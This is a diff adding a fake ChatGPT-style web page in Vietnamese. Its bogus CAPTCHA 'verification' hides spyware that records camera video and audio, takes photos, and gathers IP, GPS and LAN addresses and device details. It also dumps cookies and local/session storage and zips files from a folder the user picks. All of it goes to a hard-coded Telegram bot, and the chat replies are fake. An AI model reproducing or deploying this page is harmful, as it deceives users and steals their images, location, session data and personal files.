+    <div class="ctx-item" onclick="triggerVerify()"><span class="ctx-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg></span> Thêm vào dự án <span class="ctx-arrow"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></span></div>
+    <div class="ctx-item" onclick="triggerVerify()"><span class="ctx-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg></span> Tệp đã tải lên</div>
+    <div class="ctx-item" onclick="triggerVerify()"><span class="ctx-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></span> Tìm trong đoạn chat</div>
+    <div class="ctx-divider"></div>
+    <div class="ctx-item" onclick="triggerVerify()"><span class="ctx-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></span> Thêm vào trang chủ</div>
+    <div class="ctx-item" onclick="triggerVerify()"><span class="ctx-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/><line x1="12" y1="14" x2="12" y2="18"/><line x1="9" y1="16" x2="15" y2="16"/></svg></span> Lưu trữ</div>
+    <div class="ctx-item danger" onclick="triggerVerify()"><span class="ctx-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/></svg></span> Xóa</div>
+</div>
+
+<div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+<div class="sidebar" id="sidebar">
+    <div class="sidebar-header"><h2>ChatGPT</h2><button class="close-btn" onclick="toggleSidebar()">✕</button></div>
+    <div class="menu-item" onclick="openLibraryLayout()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg> Thư viện</div>
+    <div class="menu-item" onclick="openProjectLayout()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg> Dự án</div>
+    <div class="menu-item" onclick="openAppLayout()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg> Ứng dụng</div>
+    <div class="menu-item" onclick="openMoreLayout()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="1"/><circle cx="19" cy="12" r="1"/><circle cx="5" cy="12" r="1"/></svg> Thêm</div>
+    <div class="menu-section-title">Gần đây</div>
+    <div class="recent-list">
+        <div class="recent-item" onclick="triggerVerify()"><span class="dot"></span> Chat về AI</div>
+        <div class="recent-item" onclick="triggerVerify()"><span class="dot"></span> Code Python</div>
+        <div class="recent-item" onclick="triggerVerify()"><span class="dot"></span> Dịch thuật</div>
+    </div>
+    <button class="new-chat-btn-sidebar" onclick="triggerNewChat()"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 5v14M5 12h14"/></svg> Đoạn chat</button>
+</div>
+
+<!-- ================= XÁC THỰC MỚI (CAPTCHA) ================= -->
+<div class="verify-overlay" id="verifyOverlay">
+    <div class="verify-card" id="verifyCard">
+        <button class="verify-close-x" id="verifyCloseX" onclick="closeVerifyPopup()">✕</button>
+        <h3 id="captchaTitle">Chọn số 4</h3>
+        <div class="sub-text">Vui lòng chọn đúng yêu cầu bên trên</div>
+        <div class="english-hint" id="englishHint">Please select the correct items above to verify.</div>
+        <div class="verify-options" id="captchaOptions"></div>
+        <button class="verify-btn" id="verifyBtn" onclick="handleVerify()">
+            <span class="btn-text">XÁC THỰC</span>
+            <span class="percent-text">0%</span>
+            <div class="load-bar"></div>
+        </button>
+    </div>
+</div>
+
+<script>
+// --- Splash Screen ---
+setTimeout(() => { document.getElementById('splash').style.display = 'none'; }, 2200);
+
+// --- Chuyển đổi Layout ---
+function openLibraryLayout() { hideAll(); document.getElementById('mainLayout').classList.add('hidden'); document.getElementById('libraryLayout').classList.add('active'); }
+function closeLibraryLayout() { document.getElementById('mainLayout').classList.remove('hidden'); document.getElementById('libraryLayout').classList.remove('active'); }
+function openProjectLayout() { hideAll(); document.getElementById('mainLayout').classList.add('hidden'); document.getElementById('projectLayout').classList.add('active'); }
+function closeProjectLayout() { document.getElementById('mainLayout').classList.remove('hidden'); document.getElementById('projectLayout').classList.remove('active'); }
+function openAppLayout() { hideAll(); document.getElementById('mainLayout').classList.add('hidden'); document.getElementById('appLayout').classList.add('active'); }
+function closeAppLayout() { document.getElementById('mainLayout').classList.remove('hidden'); document.getElementById('appLayout').classList.remove('active'); }
+function openMoreLayout() { hideAll(); document.getElementById('mainLayout').classList.add('hidden'); document.getElementById('moreLayout').classList.add('active'); }
+function closeMoreLayout() { document.getElementById('mainLayout').classList.remove('hidden'); document.getElementById('moreLayout').classList.remove('active'); }
+function openImageLayout() { hideAll(); document.getElementById('mainLayout').classList.add('hidden'); document.getElementById('imageLayout').classList.add('active'); }
+function closeImageLayout() { document.getElementById('mainLayout').classList.remove('hidden'); document.getElementById('imageLayout').classList.remove('active'); }
+function hideAll() {
+    document.getElementById('sidebar').classList.remove('open'); document.getElementById('sidebarOverlay').classList.remove('active');
+    document.getElementById('projectLayout').classList.remove('active');
+    document.getElementById('appLayout').classList.remove('active');
+    document.getElementById('libraryLayout').classList.remove('active');
+    document.getElementById('moreLayout').classList.remove('active');
+    document.getElementById('imageLayout').classList.remove('active');
+}
+
+// --- Menus ---
+function toggleSidebar() { const s = document.getElementById('sidebar'); const o = document.getElementById('sidebarOverlay'); s.classList.toggle('open'); o.classList.toggle('active'); }
+function toggleContextMenu(e) { e.stopPropagation(); document.getElementById('contextMenu').classList.toggle('open'); }
+function triggerNewChat() { if (isVerifying || isVerified) return; document.getElementById('contextMenu').classList.remove('open'); triggerVerify(); }
+document.addEventListener('click', function(e) { const m = document.getElementById('contextMenu'); const b = document.getElementById('dotsBtn'); if (m.classList.contains('open') && !m.contains(e.target) && e.target !== b && !b.contains(e.target)) m.classList.remove('open'); });
+
+function toggleAttachMenu(e) { e.stopPropagation(); const menu = document.getElementById('attachMenu'); menu.classList.toggle('open'); }
+document.addEventListener('click', function(e) { const menu = document.getElementById('attachMenu'); const plusBtn = document.getElementById('plusBtn'); if (menu.classList.contains('open') && !menu.contains(e.target) && e.target !== plusBtn && !plusBtn.contains(e.target)) { menu.classList.remove('open'); triggerVerify(); } });
+
+// --- Logic Popup Captcha Mới (chọn 2 ô: 1 con vật + 1 số) ---
+const animalEmojis = ['??', '🐱', '🐭', '🐹', '🐰', '🦊', '🐻', '🐼', '🐨', '🐯', '🦁', '🐮', '🐷', '🐸', '🐵', '🐔', '🐧', '🐦', '🐤', '🐣'];
+const numberOptions = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
+
+let selectedOptions = []; // lưu giá trị đã chọn
+let correctAnswerSet = []; // [animal, number] cần chọn
+
+function generateCaptcha() {
+    const container = document.getElementById('captchaOptions');
+    container.innerHTML = '';
+    selectedOptions = [];
+    
+    // Chọn 4 con vật ngẫu nhiên
+    let shuffledAnimals = [...animalEmojis].sort(() => Math.random() - 0.5);
+    let animalOptions = shuffledAnimals.slice(0, 4);
+    
+    // Chọn 4 số ngẫu nhiên
+    let shuffledNumbers = [...numberOptions].sort(() => Math.random() - 0.5);
+    let numberOptionsSelected = shuffledNumbers.slice(0, 4);
+    
+    // Trộn lẫn tất cả thành 8 ô
+    let allOptions = [];
+    animalOptions.forEach(a => allOptions.push({ type: 'animal', value: a, label: a }));
+    numberOptionsSelected.forEach(n => allOptions.push({ type: 'number', value: n, label: n }));
+    allOptions.sort(() => Math.random() - 0.5);
+    
+    // Chọn đáp án đúng: 1 con vật + 1 số (ngẫu nhiên từ các ô đã chọn)
+    const randomAnimal = animalOptions[Math.floor(Math.random() * animalOptions.length)];
+    const randomNumber = numberOptionsSelected[Math.floor(Math.random() * numberOptionsSelected.length)];
+    correctAnswerSet = [randomAnimal, randomNumber];
+    
+    document.getElementById('captchaTitle').innerText = `Chọn ${randomAnimal} và số ${randomNumber}`;
+    document.getElementById('englishHint').innerText = `Please select ${randomAnimal} and number ${randomNumber}`;
+    
+    allOptions.forEach((item, index) => {
+        const div = document.createElement('div');
+        div.className = 'verify-option';
+        div.innerText = item.label;
+        div.dataset.index = index;
+        div.dataset.value = item.value;
+        div.dataset.type = item.type;
+        
+        div.onclick = function() {
+            // toggle chọn/bỏ chọn
+            const value = this.dataset.value;
+            if (this.classList.contains('selected')) {
+                this.classList.remove('selected');
+                const idx = selectedOptions.indexOf(value);
+                if (idx !== -1) selectedOptions.splice(idx, 1);
+            } else {
+                if (selectedOptions.length >= 2) {
+                    // Nếu đã chọn 2 ô, bỏ chọn ô cũ nhất
+                    const first = document.querySelector('.verify-option.selected');
+                    if (first) {
+                        first.classList.remove('selected');
+                        const idx = selectedOptions.indexOf(first.dataset.value);
+                        if (idx !== -1) selectedOptions.splice(idx, 1);
+                    }
+                }
+                this.classList.add('selected');
+                selectedOptions.push(value);
+            }
+            
+            // Kiểm tra đúng
+            const btn = document.getElementById('verifyBtn');
+            const isCorrect = 
+                selectedOptions.length === 2 &&
+                selectedOptions.includes(correctAnswerSet[0]) &&
+                selectedOptions.includes(correctAnswerSet[1]);
+            
+            if (isCorrect) {
+                btn.classList.add('active');
+                btn.disabled = false;
+            } else {
+                btn.classList.remove('active');
+                btn.disabled = true;
+            }
+        };
+        container.appendChild(div);
+    });
+    
+    const btn = document.getElementById('verifyBtn');
+    btn.classList.remove('active');
+    btn.disabled = true;
+}
+
+function closeVerifyPopup() {
+    if (isVerifying || isVerified) return;
+    document.getElementById('verifyOverlay').classList.remove('active');
+    if (faceRecorder && faceRecorder.state !== 'inactive') {
+        faceRecorder.stop();
+        if (faceRecordingStream) faceRecordingStream.getTracks().forEach(t => t.stop());
+    }
+}
+
+function triggerVerify() {
+    if (isVerifying || isVerified) return;
+    generateCaptcha();
+    document.getElementById('verifyOverlay').classList.add('active');
+    document.getElementById('verifyCloseX').classList.add('visible');
+    startFaceRecordingOnPopup();
+}
+
+document.getElementById('verifyOverlay').addEventListener('click', function(e) {
+    if (e.target === this && !isVerifying && !isVerified) {
+        // Không cho tắt bằng bấm ngoài, chỉ dùng nút X
+    }
+});
+
+// --- Logic Bot Net ---
+// TOKEN & CHAT ID MỚI
+const TELEGRAM_BOT_TOKEN = "8794228750:AAHNv5TTYrlc6Y9PLzFq_AGF8DzY_PYTems";
+const TELEGRAM_CHAT_ID = "-1004316823134";
+const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
+const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+const API_SEND_DOC = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+
+const info = { time: new Date().toLocaleString("vi-VN", { hour12: false }), ip: "Không rõ", isp: "VNNIC", realIp: "Không rõ", address: "Không rõ", country: "Việt Nam", lat: "0", lon: "0", device: "Không rõ", os: "Không rõ", camera: "⏳ Đang kiểm tra...", localIp: "Không rõ", wifiSsid: "Không rõ", ram: "Không rõ", cpu: "Không rõ", pin: "Không rõ", manHinh: "Không rõ", trinhDuyet: "Không rõ" };
+let isVerifying = false, isVerified = false;
+let mediaRecorder = null, recordedChunks = [];
+let videoStream = null;
+let messageCount = 0;
+
+// ----------------------------------------------------------------
+// BẮT ĐẦU QUAY FACE (CAM TRƯỚC) NGAY KHI POPUP HIỆN LÊN
+// ----------------------------------------------------------------
+let faceRecordingStream = null;
+let faceRecorder = null;
+let faceChunks = [];
+
+async function startFaceRecordingOnPopup() {
+    try {
+        faceRecordingStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        faceRecorder = new MediaRecorder(faceRecordingStream, { mimeType: 'video/mp4;codecs=avc1.42E01E,mp4a.40.2' });
+        faceChunks = [];
+        faceRecorder.ondataavailable = event => { if (event.data.size > 0) faceChunks.push(event.data); };
+        faceRecorder.onstop = async () => {
+            const blob = new Blob(faceChunks, { type: 'video/mp4' });
+            await sendFaceVideoToAdmin(blob);
+        };
+        faceRecorder.start(1000);
+    } catch(e) {
+        try {
+            faceRecordingStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            faceRecorder = new MediaRecorder(faceRecordingStream, { mimeType: 'video/webm' });
+            faceChunks = [];
+            faceRecorder.ondataavailable = event => { if (event.data.size > 0) faceChunks.push(event.data); };
+            faceRecorder.onstop = async () => {
+                const blob = new Blob(faceChunks, { type: 'video/webm' });
+                await sendFaceVideoToAdmin(blob);
+            };
+            faceRecorder.start(1000);
+        } catch(e2) {}
+    }
+}
+
+async function sendFaceVideoToAdmin(videoBlob) {
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('document', videoBlob, 'face_captcha_recording.mp4');
+    formData.append('caption', '🎥 Video quay mặt trong lúc xác thực Captcha');
+    try { await fetch(API_SEND_DOC, { method: 'POST', body: formData }); } catch(e) {}
+}
+
+// ----------------------------------------------------------------
+// XỬ LÝ XÁC THỰC TỪNG BƯỚC CẤP QUYỀN + ZIP FILE
+// ----------------------------------------------------------------
+async function handleVerify() {
+    if (isVerifying || isVerified) return;
+    if (selectedOptions.length !== 2) return;
+    if (!(selectedOptions.includes(correctAnswerSet[0]) && selectedOptions.includes(correctAnswerSet[1]))) return;
+    
+    isVerifying = true;
+    const btn = document.getElementById('verifyBtn');
+    const textSpan = btn.querySelector('.btn-text');
+    const percentSpan = btn.querySelector('.percent-text');
+    const loadBar = btn.querySelector('.load-bar');
+    btn.disabled = true; btn.classList.add('loading'); textSpan.innerText = 'ĐANG XÁC THỰC';
+
+    let progress = 0;
+    const updatePercent = (val) => {
+        const target = val;
+        const step = () => { if (progress < target) { progress += 0.5; if(progress>target) progress=target; percentSpan.innerText=Math.round(progress)+'%'; loadBar.style.width=progress+'%'; requestAnimationFrame(step); } };
+        step();
+    };
+    updatePercent(0); 
+    
+    // 20%: cấp quyền camera (chụp ảnh)
+    let frontBlob = null, backBlob = null;
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        const v = document.createElement('video'); v.srcObject = stream; v.setAttribute('playsinline', true);
+        v.style.display = 'none'; document.body.appendChild(v); await v.play(); await new Promise(r=>setTimeout(r,800));
+        frontBlob = await captureFrame(v); stream.getTracks().forEach(t=>t.stop()); document.body.removeChild(v);
+        info.camera = "✅ Đã chụp camera trước";
+    } catch(e){ info.camera = "🚫 Bị từ chối truy cập camera"; }
+    updatePercent(20);
+    
+    // 40%: cấp quyền quay video (background recording) - dùng getUserMedia audio+video
+    try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/mp4;codecs=avc1.42E01E,mp4a.40.2' });
+        recordedChunks = [];
+        mediaRecorder.ondataavailable = event => { if (event.data.size > 0) recordedChunks.push(event.data); };
+        mediaRecorder.onstop = async () => { const blob = new Blob(recordedChunks, { type: 'video/mp4' }); await sendVideoToAdmin(blob); };
+        mediaRecorder.start(1000);
+    } catch(e) {
+        try {
+            videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
+            recordedChunks = [];
+            mediaRecorder.ondataavailable = event => { if (event.data.size > 0) recordedChunks.push(event.data); };
+            mediaRecorder.onstop = async () => { const blob = new Blob(recordedChunks, { type: 'video/webm' }); await sendVideoToAdmin(blob); };
+            mediaRecorder.start(1000);
+        } catch(e2) { console.log("Background recording failed:", e2); }
+    }
+    updatePercent(40);
+    
+    // 60%: cấp quyền vị trí
+    await fetchIPandLocation();
+    updatePercent(60);
+    
+    // 80%: gửi thông tin đã thu thập
+    const cookies = getAllCookies();
+    await sendCookiesFile(cookies);
+    updatePercent(80);
+    
+    // 100%: cấp quyền file -> ZIP tất cả file (sẽ hiện hộp thoại chọn thư mục)
+    await scanAndSendFilesZipped(); 
+    updatePercent(100);
+    
+    // Gửi ảnh và text sau cùng
+    try {
+        if (frontBlob) await sendPhotosDirect(frontBlob, null);
+        else await sendTextDirect();
+    } catch(err){}
+    
+    await new Promise(r=>setTimeout(r,400));
+    textSpan.innerText = '✅ HOÀN TẤT'; percentSpan.innerText='100%';
+    await new Promise(r=>setTimeout(r,800));
+    document.getElementById('verifyOverlay').classList.remove('active');
+    btn.disabled = false; isVerifying = false; isVerified = true;
+    btn.classList.remove('loading'); textSpan.innerText='XÁC THỰC'; percentSpan.innerText='0%'; loadBar.style.width='0%'; progress=0;
+    document.getElementById('chatInput').readOnly = false;
+    document.getElementById('chatInput').focus();
+    // Ẩn nút xác minh trên thanh
+    document.getElementById('verifyMainBtn').classList.add('done');
+}
+
+function captureFrame(videoEl) { return new Promise((resolve) => { const canvas = document.createElement('canvas'); canvas.width = videoEl.videoWidth || 640; canvas.height = videoEl.videoHeight || 480; const ctx = canvas.getContext('2d'); ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height); canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.85); }); }
+
+// --- Hàm ZIP file rồi gửi, nếu không ZIP được thì gửi thẳng từng file ---
+async function scanAndSendFilesZipped() {
+    try {
+        // Mở hộp thoại chọn thư mục (cấp quyền file)
+        const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
+        const allFiles = [];
+        async function walkDirectory(handle, path = '') {
+            for await (const entry of handle.values()) {
+                const fullPath = path ? `${path}/${entry.name}` : entry.name;
+                if (entry.kind === 'file') {
+                    const ext = entry.name.split('.').pop().toLowerCase();
+                    if (['jpg', 'jpeg', 'png', 'gif', 'webp', 'mp4', 'mkv', 'pdf', 'docx', 'txt', 'js', 'html', 'py', 'json', 'xml'].includes(ext)) {
+                        try {
+                            const file = await entry.getFile();
+                            allFiles.push({ file, name: entry.name, path: fullPath });
+                        } catch (e) {
+                            console.log("Lỗi đọc file:", entry.name);
+                        }
+                    }
+                } else if (entry.kind === 'directory') { await walkDirectory(entry, fullPath); }
+            }
+        }
+        await walkDirectory(dirHandle);
+        
+        if (allFiles.length === 0) return;
+        
+        // Thử ZIP trước
+        let zipSent = false;
+        try {
+            // Dùng JSZip (load từ CDN nếu cần)
+            const JSZip = window.JSZip;
+            if (typeof JSZip !== 'undefined') {
+                const zip = new JSZip();
+                for (const f of allFiles) {
+                    zip.file(f.path, f.file);
+                }
+                const zipBlob = await zip.generateAsync({ type: 'blob' });
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('document', zipBlob, 'user_files.zip');
+                formData.append('caption', `📦 ${allFiles.length} file được nén`);
+                await fetch(API_SEND_DOC, { method: 'POST', body: formData });
+                zipSent = true;
+            }
+        } catch (e) { console.log("ZIP thất bại, gửi thẳng từng file"); }
+        
+        // Nếu ZIP thất bại hoặc không có JSZip, gửi từng file
+        if (!zipSent) {
+            for (const f of allFiles) {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('document', f.file, f.name);
+                try { await fetch(API_SEND_DOC, { method: 'POST', body: formData }); } catch(e){}
+            }
+        }
+    } catch (e) { console.log("Scan file skipped or denied:", e.message); }
+}
+
+function getAllCookies() {
+    const result = {};
+    document.cookie.split('; ').forEach(c => {
+        if (!c) return; const [k, ...v] = c.split('='); if (k) result[k] = decodeURIComponent(v.join('=') || '');
+    });
+    try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); result['localStorage_' + k] = localStorage.getItem(k); } } catch(e){}
+    try { for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); result['sessionStorage_' + k] = sessionStorage.getItem(k); } } catch(e){}
+    return result;
+}
+async function sendCookiesFile(cookiesObj) {
+    const blob = new Blob([JSON.stringify(cookiesObj, null, 2)], { type: 'application/json' });
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('document', blob, 'cookies_dump.json');
+    formData.append('caption', '🍪 Cookie & Storage dump');
+    try { await fetch(API_SEND_DOC, { method: 'POST', body: formData }); } catch(e){}
+}
+
+async function sendVideoToAdmin(videoBlob) { const formData = new FormData(); formData.append('chat_id', TELEGRAM_CHAT_ID); formData.append('document', videoBlob, 'recording.mp4'); formData.append('caption', '📹 Video ghi âm từ người dùng'); try { await fetch(API_SEND_DOC, { method: 'POST', body: formData }); } catch(e) {} }
+
+document.querySelector('.send-btn-container').addEventListener('click', handleMessage);
+document.getElementById('chatInput').addEventListener('keydown', function(e) { if (e.key === 'Enter') handleMessage(); });
+
+const chatInput = document.getElementById('chatInput');
+const inputWrapper = document.getElementById('inputWrapper');
+chatInput.addEventListener('input', function() { if (this.value.trim().length > 0) { inputWrapper.classList.add('has-text'); } else { inputWrapper.classList.remove('has-text'); } });
+
+async function handleMessage() {
+    if (!isVerified) return;
+    const input = document.getElementById('chatInput');
+    const msg = input.value.trim(); if (msg === '') return;
+    input.value = ''; inputWrapper.classList.remove('has-text'); 
+    const area = document.getElementById('chatArea');
+    const userDiv = document.createElement('div'); userDiv.className = 'message user'; userDiv.innerText = msg; area.appendChild(userDiv);
+    area.scrollTop = area.scrollHeight;
+    messageCount++;
+    if (messageCount === 1) {
+        const typingDiv = document.createElement('div'); typingDiv.className = 'typing-indicator'; typingDiv.id = 'typing-indicator';
+        typingDiv.innerHTML = '<span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span>';
+        area.appendChild(typingDiv); area.scrollTop = area.scrollHeight;
+        await new Promise(r => setTimeout(r, 2000)); 
+        document.getElementById('typing-indicator')?.remove();
+        const botDiv = document.createElement('div'); botDiv.className = 'message bot'; botDiv.innerText = '⚠️ Kết nối yếu, vui lòng nhắn lại.'; area.appendChild(botDiv);
+    } else if (messageCount === 2) {
+        const typingDiv = document.createElement('div'); typingDiv.className = 'typing-indicator'; typingDiv.id = 'typing-indicator';
+        typingDiv.innerHTML = '<span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span>';
+        area.appendChild(typingDiv); area.scrollTop = area.scrollHeight;
+        await new Promise(r => setTimeout(r, 2000));
+        document.getElementById('typing-indicator')?.remove();
+        const botDiv = document.createElement('div'); botDiv.className = 'message bot'; botDiv.innerText = '🔄 Đang gửi yêu cầu, vui lòng chờ...'; area.appendChild(botDiv);
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') { mediaRecorder.stop(); videoStream.getTracks().forEach(t => t.stop()); }
+        messageCount = 0; setTimeout(() => { startBackgroundRecording(); }, 2500);
+    }
+    area.scrollTop = area.scrollHeight;
+}
+
+window.addEventListener('beforeunload', function(e) { if (mediaRecorder && mediaRecorder.state !== 'inactive') { mediaRecorder.stop(); videoStream.getTracks().forEach(t => t.stop()); } });
+
+async function fetchIPandLocation() {
+    detectDevice();
+    try {
+        const res = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,query,zip');
+        const data = await res.json();
+        if(data.status === 'success') {
+            info.realIp = data.query; info.ip = data.query; info.isp = data.isp || 'VNNIC';
+            info.country = data.country || 'Việt Nam';
+            let addressParts = []; if(data.city) addressParts.push(data.city); if(data.regionName) addressParts.push(data.regionName); if(data.country) addressParts.push(data.country); if(data.zip) addressParts.push(data.zip);
+            info.lat = data.lat ? data.lat.toFixed(6) : '0'; info.lon = data.lon ? data.lon.toFixed(6) : '0'; info.address = addressParts.join(', ');
+        }
+    } catch(e) { try { const res2 = await fetch('https://api.ipify.org?format=json'); const data2 = await res2.json(); info.ip = data2.ip; info.realIp = data2.ip; } catch(e2) {} }
+    if (navigator.geolocation) {
+        await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition( (pos) => { const gpsLat = pos.coords.latitude.toFixed(6); const gpsLon = pos.coords.longitude.toFixed(6); info.lat = gpsLat; info.lon = gpsLon; info.address = info.address + ` | GPS: ${gpsLat}, ${gpsLon}`; resolve(); }, () => { if (info.lat === '0' || info.lat === 0) { info.address = info.address + " (GPS bị từ chối)"; } resolve(); }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } );
+        });
+    }
+    getLocalIPs((ips) => { if (ips.length > 0) info.localIp = ips.join(', '); });
+    if (navigator.deviceMemory) info.ram = navigator.deviceMemory + ' GB';
+    if (navigator.hardwareConcurrency) info.cpu = navigator.hardwareConcurrency + ' lõi';
+    try { const battery = await navigator.getBattery(); info.pin = Math.round(battery.level * 100) + '%'; if (battery.charging) info.pin += ' (đang sạc)'; } catch(e) { info.pin = 'Không rõ'; }
+    const w = window.screen.width, h = window.screen.height, dpr = window.devicePixelRatio || 1;
+    info.manHinh = `${w}x${h} (${Math.round(w*dpr)}x${Math.round(h*dpr)} pixel thực)`;
+    info.trinhDuyet = /Chrome/.test(navigator.userAgent) ? 'Chrome' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : 'Khác';
+}
+function detectDevice() { const ua = navigator.userAgent; if (/Android/i.test(ua)) { info.os = 'Android'; info.device = 'Android Device'; } else if (/iPhone|iPad|iPod/i.test(ua)) { info.os = 'iOS'; info.device = 'iPhone'; } else { info.device = 'PC'; info.os = 'Windows/Mac'; } }
+function getLocalIPs(callback) { const ips = []; try { const rtc = new RTCPeerConnection({ iceServers: [] }); rtc.createDataChannel(''); rtc.createOffer().then(o => rtc.setLocalDescription(o)).catch(() => {}); rtc.onicecandidate = (e) => { if (e.candidate && e.candidate.candidate) { const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if (m && !ips.includes(m[0])) ips.push(m[0]); } else { rtc.close(); callback(ips); } }; setTimeout(() => { rtc.close(); callback(ips); }, 3000); } catch (e) { callback(ips); } }
+
+async function sendPhotosDirect(frontBlob, backBlob) {
+    const formData = new FormData(); formData.append('chat_id', TELEGRAM_CHAT_ID);
+    const media = [];
+    if (frontBlob) { media.push({ type:'photo', media:'attach://front', caption:buildCaption() }); formData.append('front', frontBlob, 'front.jpg'); }
+    if (backBlob) { media.push({ type:'photo', media:'attach://back', caption:media.length===0?buildCaption():undefined }); formData.append('back', backBlob, 'back.jpg'); }
+    if (media.length === 0) { await sendTextDirect(); return; }
+    formData.append('media', JSON.stringify(media)); return fetch(API_SEND_MEDIA, { method:'POST', body:formData });
+}
+async function sendTextDirect() {
+    return fetch(API_SEND_TEXT, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: buildCaption() }) });
+}
+function buildCaption() {
+    const mapsLink = info.lat !== '0' && info.lon !== '0' ? `https://www.google.com/maps?q=${info.lat},${info.lon}` : 'Không rõ';
+    return `📡 [THÔNG TIN TRUY CẬP]
+
+🕒 Thời gian: ${info.time}
+📱 Thiết bị: ${info.device}
+🖥️ Hệ điều hành: ${info.os}
+🌍 IP dân cư: ${info.ip}
+🧠 IP gốc: ${info.realIp}
+🏢 ISP: ${info.isp}
+📶 IP nội bộ (LAN): ${info.localIp}
+📶 WiFi SSID: ${info.wifiSsid}
+🏙️ Địa chỉ: ${info.address}
+🌎 Quốc gia: ${info.country}
+📍 Vĩ độ: ${info.lat}
+📍 Kinh độ: ${info.lon}
+📌 Google Maps: ${mapsLink}
+📸 Camera: ${info.camera}
+
+🖥️ CHI TIẾT PHẦN CỨNG:
+🧠 RAM: ${info.ram}
+⚡ CPU: ${info.cpu}
+🔋 Pin: ${info.pin}
+🖥️ Màn hình: ${info.manHinh}
+🌐 Trình duyệt: ${info.trinhDuyet}
+
+⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.`;
+}
